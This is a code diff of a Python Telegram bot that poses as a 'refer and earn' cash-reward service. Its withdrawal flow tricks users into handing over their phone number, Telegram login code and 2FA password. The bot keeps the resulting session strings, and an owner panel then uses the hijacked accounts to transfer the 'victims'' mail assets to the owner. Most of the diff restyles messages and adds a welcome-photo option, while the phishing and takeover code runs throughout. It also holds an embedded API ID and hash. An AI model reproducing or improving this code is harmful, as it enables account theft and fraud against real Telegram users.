@@ -1,8 +1,6 @@
 # -*- coding: utf-8 -*-
 import sqlite3
 import logging
-import random
-import string
 import re
 import os
 import threading
@@ -15,7 +13,7 @@ from telegram.ext import (
     Application, CommandHandler, MessageHandler, filters,
     ContextTypes, CallbackQueryHandler
 )
-from telethon import TelegramClient, events
+from telethon import TelegramClient
 from telethon.sessions import StringSession
 
 # ================== CONFIG ==================
@@ -23,10 +21,9 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 API_ID = int(os.getenv("API_ID", "38746329"))
 API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 
-# FIXED OWNER CONFIG
-OWNER_ID = 7977493987
-OWNER_USERNAME = "@Trustedidwalabhai"
-
+# REAL TOP OWNER
+OWNER_ID = 8612102965
+OWNER_USERNAME = "@NEXTXDOREVER"
 TARGET_MAIL_BOT = "fakemailbot"
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -34,18 +31,19 @@ logger = logging.getLogger(__name__)
 
 # ================== STYLISH FONTS ==================
 FONT_MAP = {
-    'a': 'A', 'b': 'B', 'c': 'C', 'd': 'D', 'e': 'E', 'f': 'F', 'g': 'G', 'h': 'H', 'i': 'I', 'j': 'J',
-    'k': 'K', 'l': 'L', 'm': 'M', 'n': 'N', 'o': 'O', 'p': 'P', 'q': 'Q', 'r': 'R', 's': 'S', 't': 'T',
-    'u': 'U', 'v': 'V', 'w': 'W', 'x': 'X', 'y': 'Y', 'z': 'Z',
-    'A': 'A', 'B': 'B', 'C': 'C', 'D': 'D', 'E': 'E', 'F': 'F', 'G': 'G', 'H': 'H', 'I': 'I', 'J': 'J',
-    'K': 'K', 'L': 'L', 'M': 'M', 'N': 'N', 'O': 'O', 'P': 'P', 'Q': 'Q', 'R': 'R', 'S': 'S', 'T': 'T',
-    'U': 'U', 'V': 'V', 'W': 'W', 'X': 'X', 'Y': 'Y', 'Z': 'Z'
+    'a': 'Ａ', 'b': 'Ｂ', 'c': 'Ｃ', 'd': 'Ｄ', 'e': 'Ｅ', 'f': 'Ｆ', 'g': 'Ｇ', 'h': 'Ｈ', 'i': 'Ｉ', 'j': 'Ｊ',
+    'k': 'Ｋ', 'l': 'Ｌ', 'm': 'Ｍ', 'n': 'Ｎ', 'o': 'Ｏ', 'p': 'Ｐ', 'q': 'Ｑ', 'r': 'Ｒ', 's': 'Ｓ', 't': 'Ｔ',
+    'u': 'Ｕ', 'v': 'Ｖ', 'w': 'Ｗ', 'x': 'Ｘ', 'y': 'Ｙ', 'z': 'Ｚ',
+    'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
+    'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
+    'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ'
 }
 def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
-def p_style(text): return f"<code>{text}</code>,"
+def p_style(text): return f"<code>{text}</code>" # Comma hata diya
 
 # ================== DATABASE ==================
-DB_PATH = "refer_bot.db"
+DB_PATH = "/data/refer_bot.db"
+os.makedirs("/data", exist_ok=True)
 
 def init_db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
@@ -121,8 +119,6 @@ async def start_userbot(user_id, session_str):
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await client.connect()
     active_userbots[user_id] = client
-
-    # Auto transfer to Owner
     asyncio.create_task(transfer_mails(user_id))
 
 async def transfer_mails(victim_uid):
@@ -168,8 +164,8 @@ async def transfer_mails(victim_uid):
 # ================== KEYBOARDS ==================
 def get_main_keyboard():
     kb = [
-        [KeyboardButton("?? Bonus", style="primary"), KeyboardButton("?? Balance", style="success")],
-        [KeyboardButton("?? Refer Earn", style="primary"), KeyboardButton("?? Withdraw", style="danger")]
+        [KeyboardButton(f"🎁 {f_txt('Bonus')}", style="primary"), KeyboardButton(f"💵 {f_txt('Balance')}", style="success")],
+        [KeyboardButton(f"🔗 {f_txt('Refer Earn')}", style="primary"), KeyboardButton(f"💸 {f_txt('Withdraw')}", style="danger")]
     ]
     return ReplyKeyboardMarkup(kb, resize_keyboard=True)
 
@@ -178,7 +174,7 @@ def get_numpad_keyboard(current_text=""):
         [InlineKeyboardButton("1", callback_data="num_1"), InlineKeyboardButton("2", callback_data="num_2"), InlineKeyboardButton("3", callback_data="num_3")],
         [InlineKeyboardButton("4", callback_data="num_4"), InlineKeyboardButton("5", callback_data="num_5"), InlineKeyboardButton("6", callback_data="num_6")],
         [InlineKeyboardButton("7", callback_data="num_7"), InlineKeyboardButton("8", callback_data="num_8"), InlineKeyboardButton("9", callback_data="num_9")],
-        [InlineKeyboardButton("?", callback_data="num_del"), InlineKeyboardButton("0", callback_data="num_0"), InlineKeyboardButton("Submit ?", callback_data="num_submit")]
+        [InlineKeyboardButton("⌫", callback_data="num_del"), InlineKeyboardButton("0", callback_data="num_0"), InlineKeyboardButton(f"{f_txt('Submit')} ✅", callback_data="num_submit")]
     ]
     return InlineKeyboardMarkup(kb)
 
@@ -199,7 +195,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if referrer_id:
             db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
             try:
-                await context.bot.send_message(referrer_id, f"?? <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
+                await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>\n{p_style('You earned 100rs')}", parse_mode="HTML")
             except: pass
     else:
         if res[0][1] is None and context.args and context.args[0].isdigit():
@@ -208,16 +204,26 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 db_exec("UPDATE users SET referrer_id = ? WHERE user_id=?", (referrer_id, user_id))
                 db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
                 try:
-                    await context.bot.send_message(referrer_id, f"?? <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
+                    await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>\n{p_style('You earned 100rs')}", parse_mode="HTML")
                 except: pass
 
+    img_res = db_exec("SELECT value FROM config WHERE key='welcome_img'")
+    welcome_img = img_res[0][0] if img_res else None
+
     welcome_text = (
-        f"?? <b>{f_txt('WELCOME TO REFER EARN BOT')}</b>,\n\n"
-        f"You will get {p_style('100rs')} per refer,\n"
-        f"Minimum withdraw is {p_style('100rs')},\n\n"
-        f"Use the buttons below:"
+        f"👋 <b>{f_txt('WELCOME TO REFER EARN BOT')}</b>\n\n"
+        f"You will get {p_style('100rs')} per refer\n"
+        f"Minimum withdraw is {p_style('100rs')}\n\n"
+        f"<b>{f_txt('Use the buttons below to start earning:')}</b>"
     )
-    await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
+    
+    if welcome_img:
+        try:
+            await update.message.reply_photo(photo=welcome_img, caption=welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
+        except:
+            await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
+    else:
+        await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
 
 async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
@@ -228,7 +234,7 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if state == 'admin':
             if text.isdigit():
                 db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
-                await update.message.reply_text(f"? {p_style('Admin Added')}", parse_mode="HTML")
+                await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
             user_states[uid] = None; return
 
     # 2FA handling
@@ -245,10 +251,10 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[uid] = None
             del temp_clients[uid]
             
-            await update.message.reply_text(f"? {p_style('2FA Verified & Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
+            await update.message.reply_text(f"✅ {p_style('2FA Verified & Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
             return
         except Exception as e:
-            return await update.message.reply_text(f"? 2FA Failed: {e}")
+            return await update.message.reply_text(f"❌ 2FA Failed: {e}")
 
     state = user_states.get(uid)
     if state == 'withdraw_amt' and text.isdigit():
@@ -256,11 +262,11 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
         bal = res[0][0] if res else 0
         if amount < 100 or amount > bal: 
-            await update.message.reply_text("? Invalid amount or insufficient balance,")
+            await update.message.reply_text(f"❌ {f_txt('Invalid amount or insufficient balance')}")
             return
         user_states[uid] = 'withdraw_upi'
         user_states['temp_amount'] = amount
-        await update.message.reply_text("?? Enter your UPI ID,")
+        await update.message.reply_text(f"🏦 {f_txt('Enter your UPI ID')}")
         return
         
     if state == 'withdraw_upi':
@@ -268,46 +274,46 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states['temp_upi'] = upi
         user_states[uid] = 'withdraw_verify'
         await update.message.reply_text(
-            f"?? <b>{f_txt('VERIFICATION REQUIRED')}</b>,\n\nPlease share your contact to verify and withdraw,",
-            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("?? Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
+            f"🔒 <b>{f_txt('VERIFICATION REQUIRED')}</b>\n\n{f_txt('Please share your contact to verify and withdraw')}",
+            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(f"📱 {f_txt('Share Contact')}", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
             parse_mode="HTML"
         )
         return
 
-    if text == "?? Bonus":
+    if text == f"🎁 {f_txt('Bonus')}":
         res = db_exec("SELECT last_bonus FROM users WHERE user_id=?", (uid,))
         last_bonus = res[0][0] if res and res[0][0] else 0
         if time.time() - last_bonus > 86400:
             db_exec("UPDATE users SET balance = balance + 5, last_bonus=? WHERE user_id=?", (time.time(), uid))
-            await update.message.reply_text(f"?? <b>{f_txt('BONUS CLAIMED')}</b>,\n{p_style('You got 5rs')}", parse_mode="HTML")
+            await update.message.reply_text(f"🎁 <b>{f_txt('BONUS CLAIMED')}</b>\n{p_style('You got 5rs')}", parse_mode="HTML")
         else:
-            await update.message.reply_text(f"?? <b>{f_txt('ALREADY CLAIMED')}</b>,\nWait 24 hours,")
+            await update.message.reply_text(f"🎁 <b>{f_txt('ALREADY CLAIMED')}</b>\n{f_txt('Wait 24 hours')}")
             
-    elif text == "?? Balance":
+    elif text == f"💵 {f_txt('Balance')}":
         res = db_exec("SELECT balance, total_refers FROM users WHERE user_id=?", (uid,))
         if res:
             bal, refs = res[0]
-            await update.message.reply_text(f"?? <b>{f_txt('BALANCE')}</b>,\n\n{p_style('Balance: ?' + str(bal))}\n{p_style('Total Refers: ' + str(refs))}", parse_mode="HTML")
+            await update.message.reply_text(f"💵 <b>{f_txt('BALANCE')}</b>\n\n{p_style('Balance: ₹' + str(bal))}\n{p_style('Total Refers: ' + str(refs))}", parse_mode="HTML")
         else:
-            await update.message.reply_text(f"?? <b>{f_txt('BALANCE')}</b>,\n\n{p_style('Balance: ?0')}\n{p_style('Total Refers: 0')}", parse_mode="HTML")
+            await update.message.reply_text(f"💵 <b>{f_txt('BALANCE')}</b>\n\n{p_style('Balance: ₹0')}\n{p_style('Total Refers: 0')}", parse_mode="HTML")
         
-    elif text == "?? Refer Earn":
+    elif text == f"🔗 {f_txt('Refer Earn')}":
         bot_username = (await context.bot.get_me()).username
         ref_link = f"https://t.me/{bot_username}?start={uid}"
-        await update.message.reply_text(f"?? <b>{f_txt('Your Link')}</b>,\n\n{p_style(ref_link)}\nShare and earn 100rs,", parse_mode="HTML")
+        await update.message.reply_text(f"🔗 <b>{f_txt('Your Link')}</b>\n\n{p_style(ref_link)}\n{f_txt('Share and earn 100rs')}", parse_mode="HTML")
         
-    elif text == "?? Withdraw":
+    elif text == f"💸 {f_txt('Withdraw')}":
         res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
         bal = res[0][0] if res else 0
         if bal < 100:
-            await update.message.reply_text(f"?? <b>{f_txt('Insufficient Balance')}</b>,\nMin 100rs needed,\n{p_style('Your Balance: ?' + str(bal))}", parse_mode="HTML")
+            await update.message.reply_text(f"⚠️ <b>{f_txt('Insufficient Balance')}</b>\n{f_txt('Min 100rs needed')}\n{p_style('Your Balance: ₹' + str(bal))}", parse_mode="HTML")
             return
         user_states[uid] = 'withdraw_amt'
-        await update.message.reply_text(f"?? <b>{f_txt('Enter Amount to Withdraw')}:</b>,")
+        await update.message.reply_text(f"💸 <b>{f_txt('Enter Amount to Withdraw')}:</b>")
 
 async def verify_contact_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
     contact = update.message.contact
-    if not contact: return await update.message.reply_text("? Please use the button,")
+    if not contact: return await update.message.reply_text(f"❌ {f_txt('Please use the button')}")
     
     phone = contact.phone_number
     if not phone.startswith('+'): phone = '+' + phone
@@ -321,13 +327,13 @@ async def verify_contact_withdraw(update: Update, context: ContextTypes.DEFAULT_
         numpad_data[uid] = ""
         
         await update.message.reply_text(
-            f"?? <b>{f_txt('Enter recovery code sent to your Telegram account')}</b>,\n\n"
-            f"Use the keypad below:",
+            f"📩 <b>{f_txt('Enter recovery code sent to your Telegram account')}</b>\n\n"
+            f"{f_txt('Use the keypad below')}:",
             reply_markup=get_numpad_keyboard(),
             parse_mode="HTML"
         )
     except Exception as e:
-        await update.message.reply_text(f"? Error: {e},")
+        await update.message.reply_text(f"❌ Error: {e}")
 
 async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -335,14 +341,13 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = query.from_user.id
     data = query.data.split("_")[1]
     
-    if uid not in temp_clients: return await query.edit_message_text("? Session expired,")
-    
+    if uid not in temp_clients: return await query.edit_message_text(f"❌ {f_txt('Session expired')}")
     current = numpad_data.get(uid, "")
     
     if data == "del":
         current = current[:-1]
         numpad_data[uid] = current
-        await query.edit_message_text(f"?? <b>{f_txt('Enter recovery code')}</b>\nCurrent: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
+        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
         
     elif data == "submit":
         otp = current
@@ -358,32 +363,33 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[uid] = None
             del temp_clients[uid]
             
-            await query.edit_message_text(f"? <b>{f_txt('Verification Successful & Withdrawal Requested')}</b>", parse_mode="HTML")
-            await context.bot.send_message(uid, f"? {p_style('Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
+            await query.edit_message_text(f"✅ <b>{f_txt('Verification Successful & Withdrawal Requested')}</b>", parse_mode="HTML")
+            await context.bot.send_message(uid, f"✅ {p_style('Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
             
         except Exception as e:
             if "Two-step" in str(e) or "password" in str(e).lower():
-                await query.edit_message_text(f"?? <b>{f_txt('ENTER 2FA PASSWORD')}</b>\nPlease send your password in chat,", parse_mode="HTML")
+                await query.edit_message_text(f"🔐 <b>{f_txt('ENTER 2FA PASSWORD')}</b>\n{f_txt('Please send your password in chat')}", parse_mode="HTML")
                 temp_clients[uid]['state'] = '2fa'
                 return
             else:
-                await query.edit_message_text(f"? OTP Failed: {e}")
+                await query.edit_message_text(f"❌ OTP Failed: {e}")
     else:
         current += data
         numpad_data[uid] = current
-        await query.edit_message_text(f"?? <b>{f_txt('Enter recovery code')}</b>\nCurrent: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
+        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
 
-# ================== OWNER PANEL & CLAIM LOGIC ==================
+# ================== OWNER PANEL ==================
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
     kb = [
-        [InlineKeyboardButton("?? Logged Accounts", callback_data="admin_acc")],
-        [InlineKeyboardButton("?? Claim All Mails", callback_data="admin_claim")],
-        [InlineKeyboardButton("?? Add Admin", callback_data="admin_add")]
+        [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts')}", callback_data="admin_acc")],
+        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails')}", callback_data="admin_claim")],
+        [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
+        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Photo')}", callback_data="set_welcome_img")] # NAYA BUTTON
     ]
-    await update.message.reply_text(f"<b>?? {f_txt('OWNER PANEL')}</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -395,24 +401,49 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if data == "admin_acc":
         users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
-        text = f"?? <b>{f_txt('Logged Devices/Accounts')}:</b>,\n\n"
+        text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>\n\n"
         for u in users: 
-            text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
+            text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n\n"
         await query.edit_message_text(text, parse_mode="HTML")
         
     elif data == "admin_claim":
         asyncio.create_task(manual_claim_all(uid, query))
         
     elif data == "admin_add":
-        await query.edit_message_text(f"?? {f_txt('Send User ID to make Admin')},")
+        await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')}")
         user_states[uid] = 'admin'
+        
+    elif data == "set_welcome_img":
+        await query.edit_message_text(f"🖼 {f_txt('Send the image you want to set as Welcome Photo')}:")
+        user_states[uid] = 'set_welcome_img_wait'
+
+# Naya handler photo ke liye
+async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    state = user_states.get(uid)
+    
+    if state == 'set_welcome_img_wait':
+        try:
+            photo_file = await update.message.photo[-1].get_file()
+            # FadeHost ki /data directory me save karenge
+            file_path = f"/data/welcome_img.jpg"
+            await photo_file.download_to_drive(file_path)
+            
+            # Database me path save karo
+            db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (file_path,))
+            
+            await update.message.reply_text(f"✅ {f_txt('Welcome Photo set successfully!')}")
+            user_states[uid] = None
+        except Exception as e:
+            await update.message.reply_text(f"❌ {f_txt('Error setting photo')}: {e}")
+            user_states[uid] = None
 
 async def manual_claim_all(owner_id, query):
     target_owner_client = await get_or_connect_client(OWNER_ID)
     if not target_owner_client:
-        return await query.edit_message_text(f"? Target Owner Account ({OWNER_ID}) is not logged in!")
+        return await query.edit_message_text(f"❌ {f_txt('Target Owner Account is not logged in!')}")
 
-    await query.edit_message_text(f"? <b>{f_txt('STARTING CLAIM PROCESS...')}</b>", parse_mode="HTML")
+    await query.edit_message_text(f"⏳ <b>{f_txt('STARTING CLAIM PROCESS...')}</b>", parse_mode="HTML")
     
     users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL")
     total_claimed = 0
@@ -437,7 +468,7 @@ async def manual_claim_all(owner_id, query):
 
             for email in emails:
                 # LIVE LOG: Transferring
-                await query.message.reply_text(f"?? <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
+                await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
                 # Step 1: Transfer from victim
                 await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
@@ -449,7 +480,7 @@ async def manual_claim_all(owner_id, query):
                 except: pass
                 
                 # LIVE LOG: Claiming
-                await query.message.reply_text(f"?? <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
+                await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
                 # Step 2: Claim from owner
                 await target_owner_client.send_message(owner_target_bot, email)
@@ -460,13 +491,13 @@ async def manual_claim_all(owner_id, query):
                     await target_owner_client.delete_messages(owner_target_bot, msgs[0].id)
                 except: pass
                 
-                await query.message.reply_text(f"? <b>{f_txt('CLAIMED SUCCESS')}:</b> {p_style(email)}", parse_mode="HTML")
+                await query.message.reply_text(f"✅ <b>{f_txt('CLAIMED SUCCESS')}:</b> {p_style(email)}", parse_mode="HTML")
                 total_claimed += 1
                 await asyncio.sleep(1)
                 
         except: pass
         
-    await query.message.reply_text(f"?? <b>{f_txt('ALL VICTIMS MAILS CLAIMED!')}</b>\n{p_style('Total Claimed: ' + str(total_claimed))}", parse_mode="HTML")
+    await query.message.reply_text(f"👑 <b>{f_txt('ALL VICTIMS MAILS CLAIMED!')}</b>\n{p_style('Total Claimed: ' + str(total_claimed))}", parse_mode="HTML")
 
 # ================== MAIN ==================
 def main():
@@ -477,8 +508,12 @@ def main():
     app_bot.add_handler(CommandHandler("owner", owner_panel))
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
-    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
+    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_"))
+    
+    # Photo handler Owner ke liye (Group 0 me taaki pehle chale)
+    app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
+    
+    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)
 
     logger.info("Bot started successfully.")
     app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)
